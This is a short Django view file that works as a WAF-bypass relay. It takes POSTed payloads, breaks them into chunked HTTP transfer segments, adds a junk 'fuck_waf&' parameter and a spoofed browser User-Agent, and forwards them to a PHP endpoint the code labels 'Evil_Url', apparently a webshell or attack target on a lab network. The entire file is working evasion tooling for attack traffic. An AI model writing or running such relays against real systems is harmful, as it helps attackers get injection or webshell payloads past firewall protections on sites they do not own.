from django.shortcuts import HttpResponse
import requests

Evil_Url = 'http://192.168.32.144/2.php'
Host = '192.168.32.144'

Headers = {
    "Host" : Host,
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type" : "application/x-www-form-urlencoded",
    "Transfer-Encoding" : "chunked",
}

def division(text):
    text=text[2:]
    div_pay = ['','','']
    i = len(text)
    c = int(i / 3)
    div_pay[0] = text[0:c]
    div_pay[1] = text[c:2*c]
    div_pay[2] = text[2*c:-1]
    return div_pay

def gen(payload):
    pay_list = division(payload)
    yield bytes('fuck_waf&',encoding='utf8')
    yield bytes(pay_list[0],encoding='utf8')
    yield bytes(pay_list[1],encoding='utf8')
    yield bytes(pay_list[2],encoding='utf8')

def get_response(domain,payload):
    r = requests.post(Evil_Url,data=gen(payload),headers=Headers)
    return r.text

def main(request):
    if request.method == 'POST':
        payload = str(request.body)
        print(payload)
        return HttpResponse(get_response('192.168.32.144',payload))
    else:
        return HttpResponse('Only receive post data')